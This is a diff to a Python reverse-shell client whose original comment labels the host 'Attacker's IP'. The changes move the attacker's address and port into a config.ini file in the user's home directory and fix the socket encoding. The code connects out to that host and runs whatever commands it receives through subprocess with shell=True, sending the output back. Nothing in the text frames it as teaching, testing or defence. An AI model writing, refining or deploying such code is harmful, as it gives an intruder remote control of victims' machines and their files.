@@ -1,9 +1,14 @@
 import socket
 import subprocess
 import os
+import ConfigParser
 
-HOST = "000.000.000.000" # Attacker's IP
-PORT = 1234
+config_path = os.path.join(os.path.expanduser('~'), 'config.ini')
+config = ConfigParser.ConfigParser()
+config.read(config_path)
+
+HOST = config.get('Server', 'address')
+PORT = int(config.get('Server', 'port'))
 BUFFER = 4096
 SEP = "<sep>"
 error_outputs = ["Invalid command", "No such file or directory"]
@@ -22,6 +27,7 @@ def shell():
                 message = output + SEP + cwd
                 client_socket.send(message.encode())
                 continue
+
             elif split_command[0].lower() == "cd":
                 try:
                     os.chdir(' '.join(split_command[1:]))
@@ -30,9 +36,11 @@ def shell():
                     output = str(exception)
                 except IndexError:
                     output = error_outputs[1]
+
             elif command.lower() in exit_inputs:
                 client_socket.close()
                 break
+
             else:
                 try:
                     process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE,
@@ -53,21 +61,19 @@ def shell():
             print("Error: %s" % exception)
             break
 
-
 def main():
     global client_socket
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect((HOST, PORT))
         cwd = os.getcwd()
-        client_socket.send(cwd)
+        client_socket.send(cwd.encode())
         shell()
-
     except Exception as exception:
         print("Connection error: %s" % exception)
     finally:
         client_socket.close()
 
-
 if __name__ == "__main__":
     main()
+
